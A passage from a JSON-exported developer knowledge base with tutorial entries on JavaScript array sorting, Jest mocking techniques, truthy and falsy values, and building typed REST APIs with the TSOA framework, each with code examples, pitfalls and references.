undefined values.\n- Not handling locale differences in string sorting.\n\n## Practical Applications\n\n- Sorting lists, tables, or search results.\n- Organizing data before rendering in UI.\n- Implementing custom orderings (e.g., by date, score, or name).\n\n## References\n\n- [MDN: Array.prototype.sort()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort)\n- [JavaScript.info: Array methods](https://javascript.info/array-methods#sort)\n- [Wikipedia: Timsort](https://en.wikipedia.org/wiki/Timsort)\n- [Wikipedia: Quicksort](https://en.wikipedia.org/wiki/Quicksort)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Stable Sort:** Ensures equal elements retain their relative order.\n- **Multi-Level Sorting:** Chain compare logic for complex objects (e.g., sort by last name, then first name).\n- **Performance:** Timsort offers O(n log n) average time complexity and is optimized for real-world, partially sorted data. Most modern JavaScript engines use Timsort for Array.prototype.sort().\n- **Immutable Patterns:** Use `[...array].sort()` to avoid mutating the original array.\n"
    },
    {
      "id": "swe/languages/javascript/sort/sort-js",
      "title": "Sort Js",
      "path": [
        "swe",
        "languages",
        "javascript",
        "sort",
        "sort-js"
      ],
      "content": ""
    },
    {
      "id": "swe/languages/javascript/testing/test-mocking-basics",
      "title": "Fundamental Jest Unit Testing Principles: Mocking",
      "path": [
        "swe",
        "languages",
        "javascript",
        "testing",
        "test-mocking-basics"
      ],
      "content": "# Fundamental Jest Unit Testing Principles: Mocking\n\nMocking is a core concept in Jest that allows you to isolate the code under test by replacing dependencies with controlled, test-specific implementations.\n\n## Key Points\n\n- **Isolation:** Mocks help test units of code without relying on real dependencies.\n- **Types of Mocks:** Jest supports function mocks (`jest.fn()`), module mocks (`jest.mock()`), and manual mocks.\n- **Control:** Mocks can track calls, return specific values, or simulate errors.\n- **Resetting:** Always reset or clear mocks between tests to avoid state leakage.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Mocking Functions\n\n```js\nconst myMock = jest.fn();\nmyMock.mockReturnValue(42);\n\ntest('calls mock function', () => {\n  expect(myMock()).toBe(42);\n  expect(myMock).toHaveBeenCalled();\n});\n```\n\n### 2. Mocking Modules\n\n```js\n// math.js\nexport const add = (a, b) => a + b;\n\n// math.test.js\njest.mock('./math', () => ({\n  add: jest.fn(() => 10),\n}));\n\nimport { add } from './math';\n\ntest('mocked add', () => {\n  expect(add(2, 3)).toBe(10);\n});\n```\n\n### 3. Resetting Mocks\n\n```js\nbeforeEach(() => {\n  jest.clearAllMocks();\n});\n```\n\n## Common Pitfalls\n\n- Forgetting to reset mocks between tests, leading to test pollution.\n- Over-mocking, which can make tests less meaningful.\n- Not matching the mock’s signature to the real implementation.\n\n## Practical Applications\n\n- Isolating API calls, database access, or third-party services.\n- Testing error handling by simulating failures.\n- Verifying interactions between components.\n\n## References\n\n- [Jest: Mock Functions](https://jestjs.io/docs/mock-functions)\n- [Jest: Manual Mocks](https://jestjs.io/docs/manual-mocks)\n- [Jest: ES6 Class Mocks](https://jestjs.io/docs/es6-class-mocks)"
    },
    {
      "id": "swe/languages/javascript/testing/test-mocking-intermediate",
      "title": "Intermediate Jest Unit Testing: Advanced Mocking Concepts",
      "path": [
        "swe",
        "languages",
        "javascript",
        "testing",
        "test-mocking-intermediate"
      ],
      "content": "# Intermediate Jest Unit Testing: Advanced Mocking Concepts\n\nMocking at an intermediate level involves understanding partial mocks, spy functionality, implementation details, and timing control. These techniques allow you to test complex scenarios while maintaining clean, maintainable test suites.\n\n## Key Points\n\n- **Partial Mocks:** Mock only specific functions within a module while keeping others real\n- **Spies:** Track calls to real functions without changing their behavior\n- **Mock Implementations:** Control return values dynamically based on input parameters\n- **Timer Mocks:** Test time-dependent code without actual delays\n- **Clear vs Reset vs Restore:** Each serves distinct purposes in mock lifecycle management\n- **Mock Modules with Dependencies:** Handle nested module imports and side effects\n- **Constructor Mocking:** Control class instantiation and method behavior\n\n## Step-by-Step Explanation & Examples\n\n### 1. Partial Module Mocking\n\nReal-world scenario: Testing a service that uses some utility functions but not others.\n\n```js\n// utils.js\nexport const formatDate = (date) => date.toISOString();\nexport const validateEmail = (email) => email.includes('@');\n\n// service.test.js\njest.mock('./utils', () => ({\n  ...jest.requireActual('./utils'),\n  validateEmail: jest.fn(() => true), // Mock only this\n}));\n\nimport { formatDate, validateEmail } from './utils';\n\ntest('partial mock preserves real implementation', () => {\n  expect(formatDate(new Date('2025-01-01'))).toContain('2025');\n  expect(validateEmail('invalid')).toBe(true); // Mocked behavior\n});\n```\n\n### 2. Spy on Real Implementations\n\nAnecdote: I once debugged a caching issue where the cache was being called but returning stale data. Using spies, I could verify the cache function was invoked correctly while still using the real logic.\n\n```js\nimport * as mathUtils from './math';\n\ntest('spy tracks calls to real function', () => {\n  const addSpy = jest.spyOn(mathUtils, 'add');\n  \n  const result = mathUtils.add(2, 3);\n  \n  expect(result).toBe(5); // Real implementation\n  expect(addSpy).toHaveBeenCalledWith(2, 3);\n  expect(addSpy).toHaveBeenCalledTimes(1);\n  \n  addSpy.mockRestore(); // Clean up\n});\n```\n\n### 3. Dynamic Mock Implementations\n\n```js\nconst fetchUser = jest.fn((id) => {\n  if (id === 1) return { name: 'Alice', admin: true };\n  return { name: 'Bob', admin: false };\n});\n\ntest('different behaviors for different inputs', () => {\n  expect(fetchUser(1).admin).toBe(true);\n  expect(fetchUser(2).admin).toBe(false);\n});\n```\n\n### 4. Timer Mocking\n\n```js\njest.useFakeTimers();\n\nfunction delayedGreeting(callback) {\n  setTimeout(() => callback('Hello'), 1000);\n}\n\ntest('fast-forwards time', () => {\n  const mockCallback = jest.fn();\n  delayedGreeting(mockCallback);\n  \n  expect(mockCallback).not.toHaveBeenCalled();\n  jest.advanceTimersByTime(1000);\n  expect(mockCallback).toHaveBeenCalledWith('Hello');\n});\n```\n\n### 5. Mock Implementations with Promises\n\n```js\nconst apiCall = jest.fn()\n  .mockResolvedValueOnce({ data: 'first' })\n  .mockRejectedValueOnce(new Error('Network error'))\n  .mockResolvedValue({ data: 'default' });\n\ntest('handles multiple async scenarios', async () => {\n  await expect(apiCall()).resolves.toEqual({ data: 'first' });\n  await expect(apiCall()).rejects.toThrow('Network error');\n  await expect(apiCall()).resolves.toEqual({ data: 'default' });\n});\n```\n\n### 6. Clear vs Reset vs Restore\n\n```js\nconst mock = jest.fn(() => 'original');\n\nmock.mockImplementation(() => 'changed');\nmock('test');\n\n// clearAllMocks: Clears call history but keeps implementation\njest.clearAllMocks();\nexpect(mock).not.toHaveBeenCalled();\nexpect(mock()).toBe('changed');\n\n// resetAllMocks: Clears history AND implementation\njest.resetAllMocks();\nexpect(mock()).toBeUndefined();\n\n// restoreAllMocks: Only works on spies, returns to original\nconst spy = jest.spyOn(console, 'log').mockImplementation();\njest.restoreAllMocks();\n// console.log now works normally again\n```\n\n## Common Pitfalls\n\n- **Forgetting `jest.requireActual()`** in partial mocks, causing all functions to be undefined\n- **Not using `mockRestore()`** on spies, causing real implementations to stay mocked across tests\n- **Mixing fake and real timers** without proper cleanup (use `jest.useRealTimers()`)\n- **Incorrect mock placement**: `jest.mock()` must be at the top level, not inside tests\n- **Assuming mock order**: `mockReturnValueOnce` calls are consumed in sequence; plan accordingly\n\n## Practical Applications\n\n- **API Testing:** Mock HTTP clients to test different response codes without network calls\n- **Database Testing:** Mock ORM methods to verify queries without database setup\n- **Third-Party Services:** Simulate payment gateways, email services, or analytics\n- **Time-Dependent Logic:** Test scheduled tasks, rate limiting, or debouncing\n- **Error Recovery:** Verify retry logic by simulating intermittent failures\n\n## References\n\n- [Jest: Mock Functions](https://jestjs.io/docs/mock-functions)\n- [Jest: Timer Mocks](https://jestjs.io/docs/timer-mocks)\n- [Jest: ES6 Class Mocks](https://jestjs.io/docs/es6-class-mocks)\n\n---\n\n## Greater Detail: Advanced Concepts\n\n### Factory Functions and Manual Mocks\n\nCreate reusable mock factories for complex objects:\n\n```js\n// __mocks__/database.js\nexport const createMockDb = (overrides = {}) => ({\n  query: jest.fn().mockResolvedValue([]),\n  insert: jest.fn().mockResolvedValue({ id: 1 }),\n  transaction: jest.fn((callback) => callback(this)),\n  ...overrides,\n});\n```\n\n### Mocking Constructor Functions\n\nFor class-based dependencies:\n\n```js\njest.mock('./UserService');\nimport UserService from './UserService';\n\nUserService.mockImplementation(() => ({\n  getUser: jest.fn().mockResolvedValue({ id: 1, name: 'Test' }),\n  deleteUser: jest.fn(),\n}));\n\ntest('uses mocked class instance', () => {\n  const service = new UserService();\n  expect(service.getUser()).resolves.toEqual({ id: 1, name: 'Test' });\n});\n```\n\n### Advanced Spy Techniques\n\nSpy on getters/setters:\n\n```js\nconst obj = {\n  get value() { return this._value; },\n  set value(v) { this._value = v; },\n};\n\nconst getSpy = jest.spyOn(obj, 'value', 'get').mockReturnValue(42);\nconst setSpy = jest.spyOn(obj, 'value', 'set');\n\nobj.value = 100;\nexpect(setSpy).toHaveBeenCalledWith(100);\nexpect(obj.value).toBe(42); // Mocked getter\n```\n\n### Mocking Module Side Effects\n\nWhen modules execute code on import:\n\n```js\n// analytics.js (has side effect on import)\nwindow.analytics = { track: () => {} };\n\n// In test file\njest.mock('./analytics', () => {\n  const originalModule = jest.requireActual('./analytics');\n  window.analytics = { track: jest.fn() };\n  return originalModule;\n});\n```\n\n### Testing Mock Call Context\n\nVerify `this` binding and call context:\n\n```js\nconst obj = {\n  method: jest.fn(),\n};\n\nobj.method.call({ custom: 'context' }, 'arg1');\n\nexpect(obj.method.mock.contexts[0]).toEqual({ custom: 'context' });\nexpect(obj.method.mock.instances[0]).toBe(obj.method.mock.contexts[0]);\n```\n\n### Complex Async Patterns\n\nMock with delays and race conditions:\n\n```js\nconst slowApi = jest.fn(() => \n  new Promise(resolve => setTimeout(() => resolve('data'), 500))\n);\n\njest.useFakeTimers();\n\ntest('handles race condition', async () => {\n  const promise = slowApi();\n  jest.advanceTimersByTime(500);\n  await expect(promise).resolves.toBe('data');\n});\n```"
    },
    {
      "id": "swe/languages/javascript/truthy-falsey",
      "title": "Truthy and Falsy Values in JavaScript: A Well-Structured Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "truthy-falsey"
      ],
      "content": "# Truthy and Falsy Values in JavaScript: A Well-Structured Overview\n\nTruthy and falsy values determine how JavaScript evaluates non-boolean values in boolean contexts like conditionals and logical operators, enabling concise code but requiring careful understanding to avoid bugs.\n\n## Key Points\n\n- **Definition:** In boolean contexts, JavaScript coerces values to true (truthy) or false (falsy) through type coercion.\n- **Falsy Values:** Only 8 values are falsy: `false`, `0`, `-0`, `0n` (BigInt zero), `\"\"` (empty string), `null`, `undefined`, and `NaN`.\n- **Truthy Values:** Everything else is truthy, including `\"0\"`, `\"false\"`, empty arrays `[]`, empty objects `{}`, and functions.\n- **Boolean Context:** Conditionals (`if`, `while`, `for`), logical operators (`&&`, `||`, `!`), and ternary operators trigger boolean coercion.\n- **Strict Equality:** Use `===` to avoid coercion, as `==` performs type conversion before comparison.\n- **Common Pitfall:** Empty arrays and objects are truthy despite appearing \"empty.\"\n- **Best Practice:** Prefer explicit comparisons for clarity and avoid relying on implicit coercion in production code.\n\n## Step-by-Step Explanation & Examples\n\n**Complete List of Falsy Values**\n```javascript\n// ONLY these 8 values are falsy:\n\nfalse           // Boolean false\n0               // Number zero\n-0              // Negative zero\n0n              // BigInt zero\n\"\"              // Empty string (also '' and ``)\nnull            // Intentional absence of value\nundefined       // Variable declared but not assigned\nNaN             // Not a Number (invalid arithmetic result)\n\n// Testing falsy values\nif (!false) console.log('false is falsy');        // ✓ Executes\nif (!0) console.log('0 is falsy');                // ✓ Executes\nif (!\"\") console.log('empty string is falsy');    // ✓ Executes\nif (!null) console.log('null is falsy');          // ✓ Executes\nif (!undefined) console.log('undefined is falsy'); // ✓ Executes\nif (!NaN) console.log('NaN is falsy');            // ✓ Executes\n```\n\n**Truthy Values (Everything Else)**\n```javascript\n// ALL other values are truthy, including:\n\ntrue            // Boolean true\n1, -1, 3.14     // Any non-zero number\n\"0\"             // String containing \"0\" (not empty!)\n\"false\"         // String containing \"false\"\n[]              // Empty array (object type)\n{}              // Empty object\nfunction() {}   // Functions\nnew Date()      // Objects\nInfinity        // Special number value\n\n// Common surprises - these are TRUTHY:\nif (\"0\") console.log('\"0\" is truthy');           // ✓ Executes (string, not number)\nif (\"false\") console.log('\"false\" is truthy');   // ✓ Executes (string, not boolean)\nif ([]) console.log('[] is truthy');             // ✓ Executes (objects are truthy)\nif ({}) console.log('{} is truthy');             // ✓ Executes (objects are truthy)\n```\n\n**Practical Usage Patterns**\n```javascript\n// Pattern 1: Default values with logical OR\nfunction greet(name) {\n  // If name is falsy (undefined, null, \"\"), use default\n  const displayName = name || \"Guest\";\n  return `Hello, ${displayName}`;\n}\ngreet();           // \"Hello, Guest\" (undefined is falsy)\ngreet(\"\");         // \"Hello, Guest\" (empty string is falsy)\ngreet(\"Alice\");    // \"Hello, Alice\" (truthy)\n\n// Modern alternative: Nullish coalescing (??)\n// Only defaults for null/undefined, not other falsy values\nconst count = 0;\nconsole.log(count || 10);   // 10 (0 is falsy, uses default)\nconsole.log(count ?? 10);   // 0 (0 is not null/undefined, keeps value)\n\n// Pattern 2: Conditional execution with logical AND\nconst user = { name: \"Bob\", preferences: { theme: \"dark\" } };\n\n// Only access if user exists\nuser && console.log(user.name);  // Logs \"Bob\"\n\n// Safe nested property access\nconst theme = user && user.preferences && user.preferences.theme;\n// Modern alternative: Optional chaining\nconst themeModern = user?.preferences?.theme;\n\n// Pattern 3: Converting to actual boolean\nconst value = \"hello\";\nBoolean(value);     // true (explicit conversion)\n!!value;            // true (double negation shorthand)\n\n// Pattern 4: Checking for existence\nfunction processData(data) {\n  if (!data) {\n    throw new Error(\"Data is required\");\n  }\n  // Process data...\n}\nprocessData(null);      // Throws error (null is falsy)\nprocessData([]);        // Works (empty array is truthy)\nprocessData({ age: 0 }); // Works (object is truthy)\n\n// Pattern 5: Array/Object emptiness checks\nconst arr = [];\nconst obj = {};\n\n// WRONG: These are truthy!\nif (arr) console.log(\"Array exists\");  // ✓ Executes ([] is truthy)\nif (obj) console.log(\"Object exists\"); // ✓ Executes ({} is truthy)\n\n// CORRECT: Explicit emptiness checks\nif (arr.length > 0) console.log(\"Array has items\");        // ✗ Doesn't execute\nif (Object.keys(obj).length > 0) console.log(\"Object has properties\"); // ✗ Doesn't execute\n```\n\n## Common Pitfalls\n\n- Assuming `\"0\"` or `\"false\"` are falsy—they're strings, so they're truthy.\n- Using `if (array)` to check if array has items—empty arrays are truthy, use `array.length > 0`.\n- Using `if (object)` to check if object has properties—empty objects are truthy, use `Object.keys(object).length > 0`.\n- Confusing `==` with `===`—loose equality performs type coercion: `0 == false` is true, `0 === false` is false.\n- Using `||` for defaults when `0` or `\"\"` are valid values—use nullish coalescing `??` instead.\n- Not handling `NaN` specially—`NaN !== NaN` (only value not equal to itself), use `Number.isNaN()`.\n- Forgetting that `document.all` is a legacy exception—it's falsy despite being an object.\n\n## Practical Applications\n\n- **Default Parameters:** Provide fallback values when arguments are missing or falsy.\n- **Form Validation:** Check if required fields are empty before submission.\n- **API Responses:** Handle missing or null data gracefully with conditional rendering.\n- **Guard Clauses:** Early return from functions when required data is missing.\n\n**Example anecdote:** Building a settings page, I used `const fontSize = userPrefs.fontSize || 16` to default font size to 16. A user complained their custom size wasn't saving—turns out they set it to 0 (to use browser default). Since `0` is falsy, my code replaced it with 16. Switching to `userPrefs.fontSize ?? 16` fixed it, only defaulting when the value was actually `null` or `undefined`, not just falsy.\n\n## References\n\n- [MDN: Truthy](https://developer.mozilla.org/en-US/docs/Glossary/Truthy)\n- [MDN: Falsy](https://developer.mozilla.org/en-US/docs/Glossary/Falsy)\n- [MDN: Type Coercion](https://developer.mozilla.org/en-US/docs/Glossary/Type_coercion)\n- [JavaScript.info: Type Conversions](https://javascript.info/type-conversions)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Type Coercion vs Type Conversion:** Coercion is implicit (automatic), conversion is explicit (`Boolean()`, `Number()`, `String()`).\n- **Abstract Equality (==) Algorithm:** Complex coercion rules make `==` unpredictable—`[] == false` is true, but `[] == ![]` is also true.\n- **Logical Operators Return Values:** `&&` and `||` don't return booleans—they return one of the operands.\n  ```javascript\n  \"hello\" && \"world\"  // Returns \"world\" (last truthy value)\n  null || \"default\"   // Returns \"default\" (first truthy value)\n  ```\n- **Short-Circuit Evaluation:** Logical operators stop evaluating once result is determined.\n  ```javascript\n  false && expensiveFunction()  // expensiveFunction never called\n  true || expensiveFunction()   // expensiveFunction never called\n  ```\n- **Nullish Coalescing (??):** Only treats `null` and `undefined` as \"missing,\" not other falsy values like `0` or `\"\"`.\n- **Optional Chaining (?.):** Safely access nested properties, returns `undefined` if any part is null/undefined.\n- **Ternary with Truthy/Falsy:** `condition ? ifTruthy : ifFalsy` coerces condition to boolean.\n- **Boolean Constructor:** `Boolean(value)` explicitly converts to boolean, useful for filtering arrays.\n  ```javascript\n  [0, 1, \"\", \"hello\", null, \"world\"].filter(Boolean)  // [1, \"hello\", \"world\"]\n  ```\n- **Double Negation (!!):** Common idiom to convert to boolean: first `!` converts to boolean and inverts, second `!` inverts back.\n- **NaN Peculiarity:** Only value where `x !== x` is true. Use `Number.isNaN()` not `isNaN()` (global has coercion issues).\n- **document.all Exception:** Historical quirk—it's an object but evaluates as falsy for legacy browser detection code.\n- **Symbol.toPrimitive:** Objects can define custom coercion behavior via this symbol.\n- **Falsy in Conditionals vs Equality:** A value can be falsy in `if` but `== false` might still be false due to coercion rules.\n  ```javascript\n  [] == false   // true (array coerced to empty string, then to 0)\n  if ([]) {}    // Executes ([] is truthy in boolean context)\n  ```\n- **Guard Patterns:** Use falsy checks for early returns to reduce nesting.\n  ```javascript\n  if (!user) return;\n  if (!user.isActive) return;\n  // Continue with valid active user\n  ```"
    },
    {
      "id": "swe/languages/javascript/tsoa",
      "title": "TSOA: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "tsoa"
      ],
      "content": "# TSOA: Complete Overview\n\nTSOA is a TypeScript framework that generates OpenAPI (Swagger) specs and Express/Koa routes from TypeScript decorators and types. You write typed controllers with decorators, and TSOA automatically creates API documentation and runtime validation. Think of TSOA as a contract-first API builder—your TypeScript types become both the implementation and the documentation, eliminating drift between code and docs.\n\n## Key Points\n\n- **Purpose:** Type-safe REST APIs with auto-generated OpenAPI docs\n- **Decorators:** `@Route`, `@Get`, `@Post`, `@Body`, `@Query`, etc.\n- **Generates:** Routes, validation, Swagger/OpenAPI spec\n- **Frameworks:** Works with Express, Koa, Hapi\n- **Type Safety:** Request/response types enforced at compile time\n\n## Installation\n\n```bash\n# Install TSOA and dependencies\nnpm install tsoa express\nnpm install --save-dev @types/express typescript\n\n# Initialize tsoa.json config\nnpx tsoa spec-and-routes\n```\n\n## Basic Setup\n\n### tsoa.json\n\n```json\n{\n  \"entryFile\": \"src/app.ts\",\n  \"noImplicitAdditionalProperties\": \"throw-on-extras\",\n  \"controllerPathGlobs\": [\"src/controllers/**/*.ts\"],\n  \"spec\": {\n    \"outputDirectory\": \"build\",\n    \"specVersion\": 3\n  },\n  \"routes\": {\n    \"routesDir\": \"build\",\n    \"middleware\": \"express\"\n  }\n}\n```\n\n### package.json Scripts\n\n```json\n{\n  \"scripts\": {\n    \"build\": \"tsoa spec-and-routes && tsc\",\n    \"dev\": \"tsoa spec-and-routes && ts-node src/app.ts\",\n    \"generate\": \"tsoa spec-and-routes\"\n  }\n}\n```\n\n## Basic Controller\n\n```typescript\n// src/controllers/userController.ts\nimport { Controller, Get, Post, Route, Body, Path, Tags, Example } from 'tsoa';\n\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\ninterface CreateUserRequest {\n  name: string;\n  email: string;\n}\n\n@Route('users')\n@Tags('Users')\nexport class UserController extends Controller {\n  \n  @Get()\n  public async getUsers(): Promise<User[]> {\n    return [\n      { id: 1, name: 'Alice', email: 'alice@example.com' },\n      { id: 2, name: 'Bob', email: 'bob@example.com' }\n    ];\n  }\n\n  @Get('{userId}')\n  public async getUser(@Path() userId: number): Promise<User> {\n    return { id: userId, name: 'Alice', email: 'alice@example.com' };\n  }\n\n  @Post()\n  public async createUser(@Body() body: CreateUserRequest): Promise<User> {\n    return {\n      id: 3,\n      ...body\n    };\n  }\n}\n```\n\n## Route Decorators\n\n### HTTP Methods\n\n```typescript\n@Route('items')\nexport class ItemController extends Controller {\n  \n  @Get()\n  async getAll(): Promise<Item[]> { }\n\n  @Get('{id}')\n  async getOne(@Path() id: string): Promise<Item> { }\n\n  @Post()\n  async create(@Body() item: CreateItemRequest): Promise<Item> { }\n\n  @Put('{id}')\n  async update(@Path() id: string, @Body() item: UpdateItemRequest): Promise<Item> { }\n\n  @Patch('{id}')\n  async partialUpdate(@Path() id: string, @Body() updates: Partial<Item>): Promise<Item> { }\n\n  @Delete('{id}')\n  async delete(@Path() id: string): Promise<void> { }\n}\n```\n\n### Parameters\n\n```typescript\n@Route('products')\nexport class ProductController extends Controller {\n  \n  // Path parameter\n  @Get('{productId}')\n  async getProduct(@Path() productId: number): Promise<Product> { }\n\n  // Query parameters\n  @Get('search')\n  async search(\n    @Query() query: string,\n    @Query() category?: string,\n    @Query() limit: number = 10\n  ): Promise<Product[]> { }\n\n  // Request body\n  @Post()\n  async create(@Body() product: CreateProductRequest): Promise<Product> { }\n\n  // Header\n  @Get('me')\n  async getCurrentUser(@Header() authorization: string): Promise<User> { }\n\n  // Request object\n  @Post('upload')\n  async upload(@Request() request: Express.Request): Promise<UploadResponse> { }\n}\n```\n\n## Response Types\n\n### Status Codes\n\n```typescript\nimport { SuccessResponse } from 'tsoa';\n\n@Route('orders')\nexport class OrderController extends Controller {\n  \n  @Post()\n  @SuccessResponse(201, 'Created')\n  public async createOrder(@Body() order: CreateOrderRequest): Promise<Order> {\n    this.setStatus(201);\n    return createdOrder;\n  }\n\n  @Delete('{orderId}')\n  @SuccessResponse(204, 'No Content')\n  public async deleteOrder(@Path() orderId: string): Promise<void> {\n    this.setStatus(204);\n  }\n}\n```\n\n### Error Responses\n\n```typescript\nimport { ValidateError } from 'tsoa';\n\n@Route('users')\nexport class UserController extends Controller {\n  \n  @Get('{userId}')\n  public async getUser(@Path() userId: number): Promise<User> {\n    const user = await userService.find(userId);\n    \n    if (!user) {\n      this.setStatus(404);\n      throw new Error('User not found');\n    }\n    \n    return user;\n  }\n\n  @Post()\n  public async createUser(@Body() body: CreateUserRequest): Promise<User> {\n    if (!body.email.includes('@')) {\n      throw new ValidateError({\n        email: { message: 'Invalid email format', value: body.email }\n      }, 'Validation failed');\n    }\n    \n    return await userService.create(body);\n  }\n}\n```\n\n## Validation\n\n### Built-in Validation\n\n```typescript\ninterface CreateUserRequest {\n  /** @minLength 2 @maxLength 50 */\n  name: string;\n  \n  /** @pattern ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$ */\n  email: string;\n  \n  /** @minimum 18 @maximum 120 */\n  age: number;\n  \n  /** @isInt */\n  score: number;\n}\n\n@Route('users')\nexport class UserController extends Controller {\n  @Post()\n  public async create(@Body() body: CreateUserRequest): Promise<User> {\n    // TSOA validates automatically based on JSDoc comments\n    return await userService.create(body);\n  }\n}\n```\n\n### Custom Validation\n\n```typescript\n// src/validators/customValidators.ts\nimport { ValidateError } from 'tsoa';\n\nexport function validateEmail(email: string): void {\n  if (!email.match(/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/)) {\n    throw new ValidateError({\n      email: { message: 'Invalid email', value: email }\n    }, 'Validation error');\n  }\n}\n\n// Controller\n@Post()\npublic async createUser(@Body() body: CreateUserRequest): Promise<User> {\n  validateEmail(body.email);\n  return await userService.create(body);\n}\n```\n\n## Authentication\n\n```typescript\n// src/authentication.ts\nimport { Request } from 'express';\n\nexport async function expressAuthentication(\n  request: Request,\n  securityName: string,\n  scopes?: string[]\n): Promise<any> {\n  if (securityName === 'jwt') {\n    const token = request.headers.authorization?.split(' ')[1];\n    \n    if (!token) {\n      throw new Error('No token provided');\n    }\n    \n    try {\n      const decoded = verifyJWT(token);\n      \n      if (scopes) {\n        const hasScopes = scopes.every(scope => \n          decoded.scopes.includes(scope)\n        );\n        if (!hasScopes) {\n          throw new Error('Insufficient permissions');\n        }\n      }\n      \n      return decoded;\n    } catch (err) {\n      throw new Error('Invalid token');\n    }\n  }\n}\n```\n\n```typescript\n// tsoa.json - define security\n{\n  \"spec\": {\n    \"securityDefinitions\": {\n      \"jwt\": {\n        \"type\": \"http\",\n        \"scheme\": \"bearer\",\n        \"bearerFormat\": \"JWT\"\n      }\n    }\n  }\n}\n```\n\n```typescript\n// Controller with auth\nimport { Security } from 'tsoa';\n\n@Route('admin')\n@Security('jwt', ['admin'])\nexport class AdminController extends Controller {\n  \n  @Get('users')\n  public async getUsers(): Promise<User[]> {\n    // Only accessible with valid JWT token with 'admin' scope\n    return await userService.getAll();\n  }\n}\n\n@Route('profile')\nexport class ProfileController extends Controller {\n  \n  @Get()\n  @Security('jwt')\n  public async getProfile(): Promise<UserProfile> {\n    // Accessible with any valid JWT token\n    return await profileService.get();\n  }\n}\n```\n\n## OpenAPI/Swagger\n\n### Generated Spec\n\n```yaml\n# build/swagger.json (auto-generated)\nopenapi: 3.0.0\ninfo:\n  title: My API\n  version: 1.0.0\npaths:\n  /users:\n    get:\n      tags:\n        - Users\n      responses:\n        '200':\n          description: Ok\n          content:\n            application/json:\n              schema:\n                type: array\n                items:\n                  $ref: '#/components/schemas/User'\n    post:\n      tags:\n        - Users\n      requestBody:\n        required: true\n        content:\n          application/json:\n            schema:\n              $ref: '#/components/schemas/CreateUserRequest'\n      responses:\n        '200':\n          description: Ok\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/User'\n```\n\n### Documentation Decorators\n\n```typescript\nimport { Example, Tags, Response } from 'tsoa';\n\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\n@Route('users')\n@Tags('User Management')\nexport class UserController extends Controller {\n  \n  /**\n   * Retrieves all users from the database\n   * @summary Get all users\n   */\n  @Get()\n  @Example<User[]>([\n    { id: 1, name: 'Alice', email: 'alice@example.com' },\n    { id: 2, name: 'Bob', email: 'bob@example.com' }\n  ])\n  public async getUsers(): Promise<User[]> { }\n\n  /**\n   * Creates a new user\n   * @summary Create user\n   */\n  @Post()\n  @Response<ValidateErrorJSON>(422, 'Validation Failed')\n  @Example<User>({ id: 1, name: 'Alice', email: 'alice@example.com' })\n  public async createUser(@Body() body: CreateUserRequest): Promise<User> { }\n}\n```\n\n## Server Setup\n\n### Express\n\n```typescript\n// src/app.ts\nimport express from 'express';\nimport { RegisterRoutes } from '../build/routes';\nimport swaggerUi from 'swagger-ui-express';\n\nconst app = express();\n\napp.use(express.json());\n\n// Register TSOA routes\nRegisterRoutes(app);\n\n// Swagger UI\napp.use('/docs', swaggerUi.serve, async (_req, res) => {\n  return res.send(\n    swaggerUi.generateHTML(await import('../build/swagger.json'))\n  );\n});\n\n// Error handler\napp.use((err: any, req: any, res: any, next: any) => {\n  if (err.name === 'ValidateError') {\n    return res.status(422).json({\n      message: 'Validation Failed',\n      details: err.fields\n    });\n  }\n  \n  return res.status(500).json({\n    message: 'Internal Server Error'\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on http://localhost:3000');\n  console.log('API docs at http://localhost:3000/docs');\n});\n```\n\n## Advanced Patterns\n\n### Dependency Injection\n\n```typescript\n// src/services/userService.ts\nexport class UserService {\n  async getAll(): Promise<User[]> { }\n  async getById(id: number): Promise<User> { }\n  async create(data: CreateUserRequest): Promise<User> { }\n}\n\n// src/controllers/userController.ts\nimport { inject } from 'tsyringe';\n\n@Route('users')\nexport class UserController extends Controller {\n  constructor(@inject(UserService) private userService: UserService) {\n    super();\n  }\n\n  @Get()\n  public async getUsers(): Promise<User[]> {\n    return this.userService.getAll();\n  }\n}\n```\n\n### File Uploads\n\n```typescript\nimport { UploadedFile } from 'tsoa';\n\ninterface UploadResponse {\n  filename: string;\n  size: number;\n  url: string;\n}\n\n@Route('upload')\nexport class UploadController extends Controller {\n  \n  @Post()\n  public async uploadFile(\n    @UploadedFile() file: Express.Multer.File\n  ): Promise<UploadResponse> {\n    return {\n      filename: file.originalname,\n      size: file.size,\n      url: `/uploads/${file.filename}`\n    };\n  }\n}\n```\n\n### Pagination\n\n```typescript\ninterface PaginatedResponse<T> {\n  data: T[];\n  total: number;\n  page: number;\n  pageSize: number;\n}\n\n@Route('products')\nexport class ProductController extends Controller {\n  \n  @Get()\n  public async getProducts(\n    @Query() page: number = 1,\n    @Query() pageSize: number = 10\n  ): Promise<PaginatedResponse<Product>> {\n    const offset = (page - 1) * pageSize;\n    const [data, total] = await productService.findAndCount(offset, pageSize);\n    \n    return { data, total, page, pageSize };\n  }\n}\n```\n\n## Best Practices\n\n```typescript\n// ✅ Use specific types, not 'any'\ninterface CreateUserRequest {\n  name: string;\n  email: string;\n}\n\n@Post()\nasync create(@Body() body: CreateUserRequest): Promise<User> { }\n\n// ✅ Add JSDoc for documentation\n/**\n * Retrieves user by ID\n * @param userId The user's unique identifier\n */\n@Get('{userId}')\nasync getUser(@Path() userId: number): Promise<User> { }\n\n// ✅ Use validation decorators\ninterface UpdateUserRequest {\n  /** @minLength 2 */\n  name?: string;\n  \n  /** @pattern ^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$ */\n  email?: string;\n}\n\n// ✅ Set proper status codes\n@Post()\n@SuccessResponse(201, 'Created')\nasync create(@Body() body: CreateUserRequest): Promise<User> {\n  this.setStatus(201);\n  return result;\n}\n\n// ✅ Use security decorators\n@Security('jwt', ['admin'])\n@Delete('{userId}')\nasync deleteUser(@Path() userId: number): Promise<void> { }\n\n// 